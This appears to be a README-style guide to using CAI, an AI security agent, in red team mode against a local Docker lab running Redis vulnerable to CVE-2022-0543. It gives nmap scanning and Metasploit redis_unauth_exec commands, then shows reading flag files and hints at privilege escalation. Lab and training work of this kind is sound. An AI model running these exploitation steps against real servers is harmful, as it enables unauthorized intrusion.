## 🎯 Getting Started with CAI to Test Redis (CVE-2022-0543)

### 🎥 Demo (Recommended First Step)

📽 **Watch this 2-minute getting started demo**:
👉 [https://asciinema.org/a/zm7wS5DA2o0S9pu1Tb44pnlvy](https://asciinema.org/a/zm7wS5DA2o0S9pu1Tb44pnlvy)

---

### 🖥️ Step 1: Start CAI

Launch CAI from the terminal:

```bash
cia
```

You’ll enter an interactive command-line interface (CLI).

---

### 🧠 Step 2: Select a Model

When prompted (or manually), choose the model you'd like to use, e.g.:

```
Model changed to: gpt-4o
```

Or run:

```bash
/model gpt-4o
```

---

### 🕵️ Step 3: Switch to the Red Team Agent

Activate the red team agent for offensive security tasks:

```bash
/agent redteam_agent
```

This enables advanced tools for scanning, exploiting, and privilege escalation.

---

### 🐳 Step 4: Start the Vulnerable Redis Server

Use Docker to launch a vulnerable Redis instance (CVE-2022-0543):

```bash
cd $HOME/labs/vulhub/redis/CVE-2022-0543
docker compose up -d
```

Expected output:

```
✔ Network cve-2022-0543_default    Created
✔ Container cve-2022-0543-redis-1  Started
```

---

### 🔎 Step 5: Scan for Redis with Nmap

Ask CAI to scan Redis on localhost:

```bash
scan localhost redis server assume host is up
```

Expected:

```
6379/tcp open  redis   Redis key-value store 5.0.7
```

---

### 🧪 Step 6: Exploit Redis with Metasploit

In CAI, request help using Metasploit:

```bash
pentest redis server running on localhost. use metasploit to exploit
```

Then, in a local terminal:

```bash
msfconsole
```

In Metasploit:

```msf
use exploit/linux/redis/redis_unauth_exec
set RHOSTS 127.0.0.1
set RPORT 6379
exploit
```

---

### 🏁 Step 7: Capture Flags / Post Exploitation

Back in CAI, enumerate the system:

```bash
ls /home
cat /home/<user>/flag.txt
```

Explore `/etc/redis/`, `/root/`, or escalate privileges if access is gained.

---

## ✅ Summary Workflow

| Step | Task                       |
| ---- | -------------------------- |
| 1    | Launch `cia` terminal      |
| 2    | Select model (`gpt-4o`)    |
| 3    | Load Red Team agent        |
| 4    | Start Redis vuln container |
| 5    | Scan with `nmap`           |
| 6    | Exploit via Metasploit     |
| 7    | Capture flags / escalate   |
